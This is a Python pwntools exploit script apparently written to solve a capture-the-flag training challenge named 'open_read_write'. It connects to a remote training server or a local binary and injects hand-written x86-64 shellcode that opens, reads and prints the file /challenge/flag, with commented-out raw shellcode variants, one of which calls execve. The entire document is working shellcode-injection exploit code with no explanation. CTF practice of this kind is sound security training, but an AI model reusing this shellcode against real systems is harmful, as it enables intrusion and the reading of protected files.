from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
COMMANDS = """
c
"""

context.arch = "amd64"

if args.REMOTE:
    c = remote("open-read-write.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./open_read_write", gdbscript = COMMANDS) 
    else:
        c= process("./open_read_write")

shellcode = """
nop
mov rdi, rax
add rdi, 59
xor rsi, rsi
xor rax, rax
mov rax, 0x02
syscall

xor rdi, rdi
mov rdi, rax
mov rsi, rsp
mov rdx, 0x30
xor eax, eax
syscall

mov rdi, 1
mov rax, 1
syscall
"""
shellcode2 = """
mov rdi, rax
add rdi, 60
xor rsi, rsi
mov rax, 0x02
syscall
"""
shellcode_c = asm(shellcode)
c.sendline(shellcode_c+b"/challenge/flag\0")
#c.sendline(b"\x48\x89\xC7\x48\x83\xC7\x0D\x48\x31\xC0\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05/challenge/flag\0")
#c.sendline(b"\xCC\x48\x89\xC7\x48\x83\xC7\x17\x48\x31\xF6\x48\x31\xC0\x48\xC7\xC0\x3b\x00\x00\x00\x0F\x05/challenge/flag\0")

c.interactive()

